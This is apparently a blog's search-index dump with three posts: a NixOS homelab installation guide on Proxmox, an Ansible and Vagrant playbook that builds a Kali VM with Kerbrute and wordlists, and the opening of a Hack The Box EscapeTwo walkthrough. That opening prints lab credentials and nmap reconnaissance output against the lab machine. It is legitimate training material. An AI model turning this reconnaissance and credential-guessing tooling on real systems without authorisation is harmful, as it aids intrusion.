/etc/NixOS and control your entire system from that, which I have done for my homelab. Since creating the homelab I have also migrated my laptop to NixOS \u0026amp; that was a bit more involved\u0026hellip;thanks home-manager but I will create a separate post for that. While you can use a single configuration file configuration.nix, NixOS supports modularizing your configuration into multiple files that can be imported. This makes it much easier to organize and maintain larger configurations while still maintaining the \u0026ldquo;single source of truth\u0026rdquo; principle. This declarative approach means you can easily replicate the exact same system state across multiple machines - perfect for maintaining consistency across a homelab. Since your entire system configuration is just text files, you can version control it with Git, making it easy to track changes over time. Reason 2: Immutable Builds: NixOS uses a unique approach where all packages are stored in the Nix store (/nix/store) with cryptographic hashes as part of their paths. While users can still modify their home directories and data, the system packages and configurations managed by Nix cannot be modified after they\u0026rsquo;re built. This immutability prevents \u0026ldquo;dependency hell\u0026rdquo; since different versions of packages can coexist without conflict - each package has its own unique path in the Nix store. In a cruel twist of fate I had this issue this morning; I am currently still running arch linux on my desktop (the transition takes a little more planning for this machine) and I have encountered dependency hell, this has only happened to me a 3/4 times since running arch linux but I wouldn\u0026rsquo;t get this on Nix. For security reasons, this immutability is amazing. Since system packages can\u0026rsquo;t be modified after installation, it\u0026rsquo;s much harder for an adversary to create backdoors or elevate privileges by modifying system binaries. The immutable nature of builds also ensures reproducibility - given the same inputs, you\u0026rsquo;ll get the same outputs every time, which is crucial for reliable system management. Reason 3: Easily Roll-back to Previous Configuration: NixOS keeps versions (called generations) every time you rebuild your system, meaning that if you have an issue you can roll-back to a previous working configuration without issue by easily rebooting; the trade-off is this does require additional storage. However, these versions can be deleted. By default, NixOS keeps 20 generations to prevent unlimited disk usage, but this is configurable \u0026amp; generations can be manually deleted. Rollbacks aren\u0026rsquo;t just for system configurations - you can roll back individual packages as well. You can boot into any previous generation directly from the GRUB menu, making it easy to recover from problematic configurations. Additional Benefits: System updates are atomic - they either complete successfully or not at all, eliminating the risk of ending up with a partially updated system \u0026ldquo;dependency hell\u0026rdquo; The nix-shell feature lets you try packages without installing them system-wide, perfect for testing or development environments or quickly running a package. For instance like below I wanted to quickly get an overview of the folder/file structure of the directory I was in but did not have tree installed, so I run nix-shell tree -p and I am placed into temporary environment with the program installed, I can run it as expected. Once I have finished I just type \u0026ldquo;exit\u0026rdquo; and the package is removed, temporary environment destroyed and I no longer have access it to it. Flakes: It would be rude if I did not mention flakes, and I could possible incur the ire of the nix community (who are from what I have found, very nice actually, see https://discourse.nixos.org/ While not needed for this basic homelab setup, Nix Flakes provide an \u0026ldquo;experimental\u0026rdquo;* but powerful way to make Nix configurations even more reproducible and portable. They work by creating a flake.lock file (similar to package-lock.json in Node.js or Cargo.lock in Rust) that pins the exact git commit hashes of all your dependencies, including nixpkgs itself. This means that even if you come back to your configuration months later, you\u0026rsquo;ll get exactly the same build. I use them in my other setups for this predictability, but they\u0026rsquo;re completely optional and the traditional approach works great for getting started and also not required for this setup. They also make it easier to share and reuse configurations between machines since each flake is a self-contained unit with all its dependencies explicitly declared. * they are labeled as experimental but they really aren\u0026rsquo;t now, they have wide adoption. Creating the NixOS VM: Download the NixOS ISO: First we are going to need an ISO file go with the Minimal ISO at the bottom of the page. https://nixos.org/download/#NixOS-iso \u0026ldquo;Why are you recommending the GUI installer if we are going to be running this headless\u0026rdquo;, great question, this version comes with a simple GUI and is easier for everyone to follow than doing it via CLI, and you can elect to not install a Desktop Environment. Upload the NixOS ISO: I am doing this on Proxmox, but you can do it using whatever virtualization/vps you use, just substitute these steps for whatever your preferred platform is.\nLogin to your Proxmox node/cluster and upload the image to the ISO Images storage:\nCreating a VM on Proxmox: Select the Node of your cluster (if you have more than one) \u0026amp; click \u0026ldquo;Create VM\u0026rdquo;\nAssign a Hostname:\nI would also select start on boot so if your Proxmox instance goes down it will automatically restart the VM \u0026amp; services on boot. (You will need to have the \u0026ldquo;Advanced\u0026rdquo; box ticked at the bottom.) Installation Media:\nSelect the NixOS iso. System:\nAs we don\u0026rsquo;t want to use legacy-bios (as we want to use systemd boot we are going to select OVMF (UEFI)) \u0026amp; the machine type will be q35\nStorage: +important+: The default storage size for new VM\u0026rsquo;s is 32GB, I would personally recommend upping this, the reason being is that, as mentioned previously, NixOS keeps versions whenever you rebuild the system VM. These versions can be deleted but if you do intend to make frequent changes or test things I would recommend upping the size of storage if you have the means. CPU/Cores:\nAs we are running fairly lightweight containers \u0026amp; OS I found that 1 Socket \u0026amp; 2 Cores was more than enough. +Note+: My Proxmox cluster is running on Think Centre M910q\u0026rsquo;s which have 7th Gen i5\u0026rsquo;s so not the most robust of equipment and they handled it fine so if you think you don\u0026rsquo;t have enough juice these are 6 year old CPU\u0026rsquo;s. Memory:\nI have assigned 8GB which I found was more than enough for this \u0026amp; each of my nodes has 24GB. Network:\nI left the Network tab as default however if you want to assign a dedicated NIC etc you can do that here, but my nodes have 1 Ethernet port so is not applicable. At the \u0026ldquo;Confirm\u0026rdquo; screen you should have something that looks similar to the below.\n+Note+: Ensure you do not have \u0026ldquo;Start after created\u0026rdquo; enabled as we want to add an additional drive for our docker data. Creating an additional drive to host our docker data: The primary reason for doing this is to have data persist across changes. If I decide to change OS in the future if I have my persistent data on an external drive I can easily mount this gives me far more flexibility with the lab.\nClick the VM, \u0026ndash;\u0026gt; \u0026ldquo;Hardware\u0026rdquo; \u0026ndash;\u0026gt; \u0026ldquo;Add\u0026rdquo; \u0026ndash;\u0026gt; Hard Disk\nIn the new window, set the size of the drive. I opted for 40GB as this drive is mainly used to hold just docker config data. The actual main storage for my containers, like media is passed by NFS mounts from my NAS.\nNow when you look at the Hardware for the VM you should see two SCSI drives.\n+Note+: Ignore the size of my drives, these are purely for illustrative purposes. I also know this can be done at machine creation time however I wanted to split things up to make it simple for everyone. Change Boot Order: So we can boot from the installer ISO we need to modify our boot order.\nSelect your VM \u0026amp; then \u0026ldquo;Options\u0026rdquo; \u0026amp; double click \u0026ldquo;Boot Order\u0026rdquo;\nDrag the ISO to the top of the boot order \u0026amp; click \u0026ldquo;OK\u0026rdquo;\nDisabling Secure Boot So We Can Boot: For some reason the system will not boot unless we disable secure boot from the UEFI interface to do this, do the following:\nSelect the VM and click \u0026ldquo;Console\u0026rdquo;\nThis will open the console window\nClick \u0026ldquo;Start Now\u0026rdquo; and as soon as it boots hit \u0026ldquo;ESCAPE\u0026rdquo; on your keyboard, this will show the EUFI manager interface:\nUse your keyboard to select \u0026ldquo;Device Manager\u0026rdquo; \u0026amp; hit \u0026ldquo;ENTER\u0026rdquo;\nOn the next page select \u0026ldquo;Secure Boot Configuration\u0026rdquo;\nIn the next screen, press down on your keyboard until you highlighted the [X]\nPress \u0026ldquo;ENTER\u0026rdquo; on your keyboard (the below message will display, hit \u0026ldquo;ENTER again\u0026rdquo;)\nNow back out of this menu and the next by pressing \u0026ldquo;ESCAPE\u0026rdquo; twice\nSelect \u0026ldquo;Continue\u0026rdquo;\nThen press \u0026ldquo;ENTER\u0026rdquo; again.\nInstalling NixOS: The VM should auto start, if it does not just follow the below steps.\nStart the VM: Start the host.\nOpen the console.\nFollow the installer prompts: The installer is the Calameres installer so if you have ever installed Linux before you may have encountered this installer.\n+Note+: I will not cover all steps as I hope you can select your language \u0026amp; keyboard layout yourself if you\u0026rsquo;ve managed to configure Proxmox. Ensure that \u0026ldquo;No desktop\u0026rdquo; is selected as it is not required for this setup.\nIf you do intend to use \u0026ldquo;Unfree Software\u0026rdquo; I would tick the box, however for this setup it\u0026rsquo;s not required.\nDisks:\nErase disk \u0026amp; ensure \u0026ldquo;No Swap\u0026rdquo; is selected. +Note+: I would always encourage users to Encrypt the system however this is up-to yourselves, if you do encrypt the system if it ever reboots you will need to enter the LUKS password, there are various ways to do this remotely, e.g. using Tailscale \u0026amp; setting up initrd ssh, which I will cover in later tutorials, but if you don\u0026rsquo;t care you can skip this step. Install:\n+Tip+: Click \u0026ldquo;Toggle Log\u0026rdquo; as soon as you star the install, the reason being is that the installer appears to stick at 46% percent for a lot of people whereas if you have the log viewable you can actually see it is progressing even though it may appear it is not.\nOnce complete restart the host:\nChange Boot Order\u0026hellip;again: You may find it boots to the installer again, if so shutdown the VM using the console.\nSelect your VM \u0026amp; then \u0026ldquo;Options\u0026rdquo; \u0026amp; double click \u0026ldquo;Boot Order\u0026rdquo;\nUn-tick the \u0026ldquo;Enabled\u0026rdquo; box on the ISO \u0026amp; click \u0026ldquo;OK\u0026rdquo;\nLogin to NixOS: As we are using Proxmox our first login will be via using the console, use the credentials you provided in the VM creation.\nAs this is already getting pretty long I will go over the configuration for the VM in my next post.\nAs always hack the planet homelab!\n", 
        "url": "http:\/\/localhost:1313\/homelab\/20250220118-nixos-homelab\/"
    },
    
    "http:\/\/localhost:1313\/tags\/ansible\/": {
        "title": "Ansible",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/ansible\/"
    },
    
    "http:\/\/localhost:1313\/tools\/automatingqemukalivmansible\/": {
        "title": "Automating Kali VM Setup with QEMU and Ansible",
        "tags": ["kali","automation","qemu","ansible","dotfiles",],
        "content": "As a cybersecurity enthusiast and productivity junkie, I\u0026rsquo;ve always been fascinated by the power of automation. Recently, I decided to streamline my process of setting up Kali Linux virtual machines using QEMU and Ansible. In this article, I\u0026rsquo;ll walk you through how I\u0026rsquo;ve automated the creation and configuration of Kali VMs, complete with my preferred dotfiles and tools.\nThe Need for Automation If you\u0026rsquo;re like me, you probably find yourself creating new Kali VMs frequently for various projects or testing environments. The process of setting up a new VM, updating the system, installing your favorite tools, and configuring your environment can be time-consuming and repetitive. That\u0026rsquo;s where automation comes in handy. You can repurpose this setup for other projects, just change the Ansible playbook and dotfiles.\nBenefits and Challenges This automation setup offers several advantages:\nConsistent environment across all VMs Rapid deployment of new instances Version-controlled configuration (infrastructure as code) Easy sharing and collaboration Some challenges I encountered:\nVirtioFS setup complexity Ansible role organization Package version management Dotfiles synchronization But the benefits far outweigh the initial setup effort.\nPrerequisites Choose your preferred virtualization provider:\nVirtualBox Setup VirtualBox Vagrant Ansible QEMU/KVM Setup (Linux only) (My preferred setup) QEMU/KVM (≥ 4.2) Libvirt (≥ 6.2.0) Vagrant Ansible For QEMU/KVM shared folder support:\nHost: Linux kernel ≥ 5.4\nGuest: Linux kernel ≥ 5.4\nThere is some additional setup required for the vagrant-libvirt plugin so would advise you checkout QEMU/KVM Setup Guide Unable to resolve dependency vagrant-libvirterror: +Update+ 21/02/2025 I recently ran an update and encountered an issue where it refused to launch new VM\u0026rsquo;s. I received an error similar to the below (it was not exactly the same as I had a crash shortly after). Error message given during initialization: Unable to resolve dependency: user requested 'vagrant-libvirt (= 0.12.2)' after alot of searching I found this post I found following the steps resolved the issue. vagrant plugin repair vagrant plugin expunge --reinstall vagrant plugin update VAGRANT_DISABLE_STRICT_DEPENDENCY_ENFORCEMENT=1 vagrant plugin install vagrant-libvirt The Automation Stack My automation setup consists of three main components:\nVagrant for VM provisioning QEMU/KVM for virtualization Ansible for configuration management Let\u0026rsquo;s dive into each component.\n1. Vagrant with QEMU/KVM I chose QEMU/KVM over VirtualBox for several reasons:\nBetter performance on Linux hosts Once you have used KVM/QEMU you will never go back to VirtualBox etc. Native virtualization support VirtioFS for efficient file sharing The Vagrantfile handles:\nVM resource allocation (RAM, CPU) Network configuration Shared folder setup with VirtioFS Ansible provisioner integration Here\u0026rsquo;s the the Vagrantfile:\n# -*- mode: ruby -*- # vi: set ft=ruby : Vagrant.configure(\u0026#34;2\u0026#34;) do |config| config.vm.box = \u0026#34;kalilinux/rolling\u0026#34; config.vm.hostname = \u0026#34;kali-vm\u0026#34; # Set hostname inside VM # Disable the default share config.vm.synced_folder \u0026#34;.\u0026#34;, \u0026#34;/vagrant\u0026#34;, disabled: true # Force libvirt provider ENV[\u0026#39;VAGRANT_DEFAULT_PROVIDER\u0026#39;] = \u0026#39;libvirt\u0026#39; # QEMU/libvirt specific settings config.vm.provider :libvirt do |libvirt| libvirt.memory = 8192 libvirt.cpus = 4 libvirt.graphics_type = \u0026#34;spice\u0026#34; libvirt.video_type = \u0026#34;qxl\u0026#34; libvirt.title = \u0026#34;Kali Linux VM\u0026#34; # Set VM title in libvirt libvirt.description = \u0026#34;Kali Linux VM for Security Testing\u0026#34; # Optional description # Enable shared memory for VirtioFS libvirt.memorybacking :access, :mode =\u0026gt; \u0026#34;shared\u0026#34; end # Configure shared folders using VirtioFS config.vm.synced_folder \u0026#34;/home/martin/.config/tmuxinator\u0026#34;, \u0026#34;/home/vagrant/.config/tmuxinator\u0026#34;, type: \u0026#34;virtiofs\u0026#34; config.vm.synced_folder \u0026#34;/home/martin/Dropbox/40-49_Career/45-KaliShared/45.02-LinuxTools\u0026#34;, \u0026#34;/home/vagrant/linuxTools\u0026#34;, type: \u0026#34;virtiofs\u0026#34; config.vm.synced_folder \u0026#34;/home/martin/Dropbox/40-49_Career/45-KaliShared/45.01-WindowsTools\u0026#34;, \u0026#34;/home/vagrant/windowsTools\u0026#34;, type: \u0026#34;virtiofs\u0026#34; config.vm.synced_folder \u0026#34;/home/martin/Dropbox/40-49_Career\u0026#34;, \u0026#34;/home/vagrant/Dropbox/40-49_Career\u0026#34;, type: \u0026#34;virtiofs\u0026#34; # Network settings config.vm.network \u0026#34;private_network\u0026#34;, ip: \u0026#34;192.168.57.11\u0026#34; config.ssh.forward_x11 = true # Provisioning configuration for Ansible config.vm.provision \u0026#34;ansible\u0026#34; do |ansible| ansible.playbook = \u0026#34;../../Ansible/configure-kali.yml\u0026#34; end end 2. Ansible Configuration Ansible automates the entire VM setup process. The main playbook handles:\nSystem updates and package installation Development tools setup Security tools installation Terminal environment configuration (Alacritty, Tmux) Editor setup (Doom Emacs) Dotfiles deployment Here\u0026rsquo;s the main Ansible playbook:\n--- - name: Configure Kali Linux hosts: all become: yes # This is equivalent to using sudo vars: user_home: \u0026#34;/home/vagrant\u0026#34; docker_gpg_key_url: \u0026#34;https://download.docker.com/linux/debian/gpg\u0026#34; docker_repo: \u0026#34;deb [arch=amd64 signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian bookworm stable\u0026#34; tasks: - name: Update apt cache apt: update_cache: yes cache_valid_time: 3600 - name: Download Iosevka Nerd Font (be patient big file!) get_url: url: https://github.com/ryanoasis/nerd-fonts/releases/download/v3.3.0/Iosevka.zip dest: /tmp/Iosevka.zip mode: \u0026#39;0644\u0026#39; - name: Install unzip if not present apt: name: unzip state: present - name: Extract Iosevka font unarchive: src: /tmp/Iosevka.zip dest: \u0026#34;/usr/local/share/fonts/\u0026#34; remote_src: yes owner: vagrant group: vagrant - name: Update font cache command: fc-cache -fv become_user: vagrant - name: Install base packages apt: name: - eza - alacritty - git - bat - seclists - git - emacs - ripgrep - fd-find state: present - name: Create docker GPG directory file: path: /etc/apt/keyrings state: directory mode: \u0026#39;0755\u0026#39; - name: Check if Docker GPG key exists stat: path: /etc/apt/keyrings/docker.gpg register: docker_gpg - name: Add Docker GPG key shell: | curl -fsSL {{ docker_gpg_key_url }} | gpg --dearmor -o /etc/apt/keyrings/docker.gpg when: not docker_gpg.stat.exists - name: Check if Docker repository exists stat: path: /etc/apt/sources.list.d/docker.list register: docker_repo_file - name: Add Docker repository copy: content: \u0026#34;{{ docker_repo }}\u0026#34; dest: /etc/apt/sources.list.d/docker.list when: not docker_repo_file.stat.exists - name: Install Docker packages apt: name: - docker-ce - docker-ce-cli - containerd.io update_cache: yes state: present - name: Download Starship install script get_url: url: https://starship.rs/install.sh dest: /tmp/starship-install.sh mode: \u0026#39;0755\u0026#39; register: download_script - name: Install Starship shell: /tmp/starship-install.sh --yes args: creates: /usr/local/bin/starship when: download_script is success async: 180 # 5 minute timeout poll: 5 # Check every 5 seconds - name: Install oh-my-zsh become_user: vagrant shell: sh -c \u0026#34;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\u0026#34; \u0026#34;\u0026#34; --unattended args: creates: \u0026#34;{{ user_home }}/.oh-my-zsh\u0026#34; - name: Install zsh plugins become_user: vagrant git: repo: \u0026#34;{{ item.repo }}\u0026#34; dest: \u0026#34;{{ user_home }}/.oh-my-zsh/custom/plugins/{{ item.name }}\u0026#34; loop: - { repo: \u0026#39;https://github.com/zsh-users/zsh-autosuggestions\u0026#39;, name: \u0026#39;zsh-autosuggestions\u0026#39; } - { repo: \u0026#39;https://github.com/zsh-users/zsh-syntax-highlighting.git\u0026#39;, name: \u0026#39;zsh-syntax-highlighting\u0026#39; } - { repo: \u0026#39;https://github.com/marlonrichert/zsh-autocomplete.git\u0026#39;, name: \u0026#39;zsh-autocomplete\u0026#39; } - { repo: \u0026#39;https://github.com/zdharma-continuum/fast-syntax-highlighting.git\u0026#39;, name: \u0026#39;fast-syntax-highlighting\u0026#39; } - name: Install tmuxinator gem: name: tmuxinator state: present - name: Clone Statistically Likely Usernames git: repo: https://github.com/insidetrust/statistically-likely-usernames.git dest: /usr/share/wordlists/statistically-likely-usernames - name: Download and install Kerbrute get_url: url: https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 dest: /usr/local/bin/kerbrute mode: \u0026#39;0755\u0026#39; - name: Install build dependencies for Emacs apt: name: - build-essential - libgccjit-12-dev - libgnutls28-dev - libjansson4 - libjansson-dev - libncurses-dev - libsqlite3-dev - libgif-dev - libjpeg-dev - libpng-dev - libtiff5-dev - libxpm-dev - libwebp-dev - libgtk-3-dev - texinfo - autoconf - automake - pkg-config state: present install_recommends: no register: pkg_result retries: 3 delay: 5 until: pkg_result is success - name: Install tree-sitter separately apt: name: libtree-sitter-dev state: present register: tree_sitter_result retries: 3 delay: 5 until: tree_sitter_result is success - name: Check if Emacs 29.4 is installed command: emacs --version register: emacs_version ignore_errors: true changed_when: false - name: Clone Emacs repository git: repo: git://git.savannah.gnu.org/emacs.git dest: /tmp/emacs version: emacs-29.4 when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; - name: Run autogen shell: | cd /tmp/emacs ./autogen.sh when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; - name: Configure Emacs shell: | cd /tmp/emacs ./configure --with-native-compilation --with-json --with-tree-sitter --with-sqlite3 args: creates: /tmp/emacs/Makefile when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; - name: Build Emacs shell: | cd /tmp/emacs make -j$(nproc) args: creates: /tmp/emacs/src/emacs when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; async: 1800 poll: 15 - name: Install Emacs become: yes shell: | cd /tmp/emacs make install args: creates: /usr/local/bin/emacs when: \u0026#34;emacs_version.rc != 0 or \u0026#39;29.4\u0026#39; not in emacs_version.stdout|default(\u0026#39;\u0026#39;)\u0026#34; async: 900 poll: 15 - name: Install other base packages apt: name: - eza - alacritty - git - bat - seclists - ripgrep - fd-find state: present install_recommends: no - name: Setup dotfiles become_user: vagrant block: - name: Clone dotfiles git: repo: https://github.com/bloodstiller/kaliconfigs.git dest: \u0026#34;{{ user_home }}/.dotfiles\u0026#34; version: main # Or whatever branch you\u0026#39;re using update: yes # Ensures latest version is cloned clone: yes force: yes # This will overwrite local changes - name: Create required directories file: path: \u0026#34;{{ item }}\u0026#34; state: directory loop: - \u0026#34;{{ user_home }}/.doom.d\u0026#34; - \u0026#34;{{ user_home }}/.config\u0026#34; - name: Create symlinks file: src: \u0026#34;{{ item.src }}\u0026#34; dest: \u0026#34;{{ item.dest }}\u0026#34; state: link force: yes loop: - { src: \u0026#34;{{ user_home }}/.dotfiles/Zsh/.zshrc\u0026#34;, dest: \u0026#34;{{ user_home }}/.zshrc\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/config.el\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/config.el\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/init.el\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/init.el\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/packages.el\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/packages.el\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Doom/README.org\u0026#34;, dest: \u0026#34;{{ user_home }}/.doom.d/README.org\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Starship/starship.toml\u0026#34;, dest: \u0026#34;{{ user_home }}/.config/starship.toml\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Alacritty\u0026#34;, dest: \u0026#34;{{ user_home }}/.config/Alacritty\u0026#34; } - { src: \u0026#34;{{ user_home }}/.dotfiles/Tmux/.tmux.conf\u0026#34;, dest: \u0026#34;{{ user_home }}/.tmux.conf\u0026#34; } - name: Install Doom Emacs become_user: vagrant block: - name: Clone Doom Emacs git: repo: https://github.com/doomemacs/doomemacs dest: \u0026#34;{{ user_home }}/.config/emacs\u0026#34; depth: 1 - name: Install Doom Emacs # This is correct and the path is correct! shell: \u0026#34;{{ user_home }}/.config/emacs/bin/doom install --force\u0026#34; args: creates: \u0026#34;{{ user_home }}/.emacs.d/bin/doom\u0026#34; async: 900 poll: 15 - name: Update Doom recipe repositories shell: \u0026#34;{{ user_home }}/.config/emacs/bin/doom sync -u\u0026#34; async: 900 poll: 15 - name: Enable Docker service systemd: name: docker enabled: yes state: started - name: Add user to docker group user: name: vagrant groups: docker append: yes - name: Clean up apt: autoremove: yes clean: yes 3. Dotfiles and Tool Configuration The automation includes configuration for:\nAlacritty terminal emulator Tmux with custom keybindings Doom Emacs with security-focused packages Starship cross-shell prompt Zsh with Oh My Zsh Each tool has its own configuration module in the repository:\nAlacritty Configuration Tmux Configuration Doom Emacs Configuration Starship Configuration Zsh Configuration Included Tools \u0026amp; Features The automation sets up a comprehensive environment with:\nSecurity Tools SecLists (lots of lists) Kerbrute for Kerberos authentication testing Statistically Likely Usernames wordlist Common pentesting tools (I have my folders for linux \u0026amp; windows tools (I will make a repo for that soon)) Bloodhound for Active Directory analysis (dockerized) Development Environment Emacs 29.4 with native compilation Doom Emacs configuration This is my main editor and I use it for everything but if you prefer another editor you can change the Ansible playbook. Git version control Docker and Docker Compose Build tools and development libraries Modern Terminal Experience Alacritty terminal emulator Starship cross-shell prompt Tmuxinator for session management Command Line Improvements Eza (modern ls replacement) Bat (better cat) Ripgrep for searching fd-find for file discovery Enhanced Zsh configuration: zsh-autosuggestions zsh-syntax-highlighting zsh-autocomplete fast-syntax-highlighting Getting Started To use this automation:\nClone the repository:\ngit clone https://github.com/bloodstiller/kaliconfigs.git cd kaliconfigs Install prerequisites:\n# For Debian/Ubuntu sudo apt install qemu-kvm libvirt-daemon-system libvirt-clients vagrant ansible # For Arch Linux sudo pacman -S qemu-full libvirt vagrant ansible Start the VM:\ncd Vagrant/QEMU vagrant up Development Workflow For efficient development and testing:\nRerun only Ansible playbooks:\nvagrant provision Run Ansible directly against the VM:\nvagrant ssh-config \u0026gt; vagrant-ssh-config ansible-playbook -i .vagrant/provisioners/ansible/inventory/vagrant_ansible_inventory Ansible/configure-kali.yml Use snapshots for safe testing:\nvagrant snapshot save baseline vagrant snapshot restore baseline Customization Options The automation is highly customizable:\nVM Resources (Vagrantfile):\nconfig.vm.provider :libvirt do |libvirt| libvirt.memory = 8192 libvirt.cpus = 4 end Package Selection (Ansible):\n​ - name: Install base packages apt: name: ​ - eza ​ - alacritty ​ - git # Add your packages here Shared Folders:\nconfig.vm.synced_folder \u0026#34;/path/to/host\u0026#34;, \u0026#34;/path/in/guest\u0026#34;, type: \u0026#34;virtiofs\u0026#34; Documentation \u0026amp; Resources For detailed setup and configuration instructions, refer to:\nMain Project Documentation - Overview and quick start guide Ansible Configuration Guide - Detailed playbook customization QEMU/KVM Setup Guide - QEMU-specific installation and configuration Alacritty Configuration - Terminal emulator setup Doom Emacs Configuration - Editor configuration Tmux Configuration - Terminal multiplexer setup Starship Configuration - Shell prompt customization Zsh Configuration - Shell configuration and plugins Conclusion Automating Kali VM setup with QEMU and Ansible has significantly improved my workflow. The combination of Vagrant for VM management, QEMU for virtualization, and Ansible for configuration provides a powerful and flexible automation stack.\nThe complete code is available in my kaliconfigs repository . Feel free to fork it and adapt it to your needs.\nHappy hacking!\n", 
        "url": "http:\/\/localhost:1313\/tools\/automatingqemukalivmansible\/"
    },
    
    "http:\/\/localhost:1313\/tags\/automation\/": {
        "title": "Automation",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/automation\/"
    },
    
    "http:\/\/localhost:1313\/tags\/dotfiles\/": {
        "title": "Dotfiles",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/dotfiles\/"
    },
    
    "http:\/\/localhost:1313\/tags\/kali\/": {
        "title": "Kali",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/kali\/"
    },
    
    "http:\/\/localhost:1313\/tags\/qemu\/": {
        "title": "Qemu",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/qemu\/"
    },
    
    "http:\/\/localhost:1313\/tools\/": {
        "title": "Tools",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tools\/"
    },
    
    "http:\/\/localhost:1313\/tags\/active-directory\/": {
        "title": "Active Directory",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/active-directory\/"
    },
    
    "http:\/\/localhost:1313\/tags\/box\/": {
        "title": "Box",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/box\/"
    },
    
    "http:\/\/localhost:1313\/tags\/ca\/": {
        "title": "CA",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/ca\/"
    },
    
    "http:\/\/localhost:1313\/tags\/certificate\/": {
        "title": "Certificate",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/certificate\/"
    },
    
    "http:\/\/localhost:1313\/tags\/easy\/": {
        "title": "Easy",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/easy\/"
    },
    
    "http:\/\/localhost:1313\/tags\/esc4\/": {
        "title": "ESC4",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/esc4\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/escapetwo-box\/": {
        "title": "EscapeTwo HTB Walkthrough",
        "tags": ["Box","HTB","Easy","Windows","LDAP","Active Directory","Certificate","CA","WriteOwner","MSSQL","xp_cmdshell","kerberoasting","kerberos","ESC4","Shadow Credentials",],
        "content": "EscapeTwo Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/EscapeTwo How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: Assumed Breach Box: This box scenario assumes that the Active Directory (AD) environment has already been breached and that we have access to valid credentials. User: rose Pass: KxEPkKe6R8su This approach reflects a more realistic model, given that direct breaches of AD environments from external footholds are increasingly rare today. +Note+: Even with assumed credentials, I’ll still conduct my standard enumeration process as if I don’t have them. This ensures I don’t overlook any findings just because access is available. Comprehensive documentation of all discoveries remains essential. NMAP: Basic Scans: Basic TCP Scan: nmap $box -Pn -oA TCPbasicScan kali in HTB/BlogEntriesMade/EscapeTwo/scans/nmap 🍣 main 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 07:55:29 zsh ❯ nmap $box -Pn -oA TCPbasicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-13 07:56 GMT Nmap scan report for 10.129.146.182 Host is up (0.038s latency). Not shown: 988 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 1433/tcp open ms-sql-s 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Nmap done: 1 IP address (1 host up) scanned in 4.44 seconds Initial thoughts: Pretty Standard affair for AD, DNS, Kerberos, RPC, LDAP but also MSSQL. Comprehensive Scans: In depth scan TCP:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in HTB/BlogEntriesMade/EscapeTwo/scans/nmap 🍣 main 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 07:56:07 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-13 07:56 GMT Nmap scan report for 10.129.146.182 Host is up (0.045s latency). Not shown: 65509 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-01-13 07:59:29Z) 135/tcp open msrpc Microsoft Windows RPC 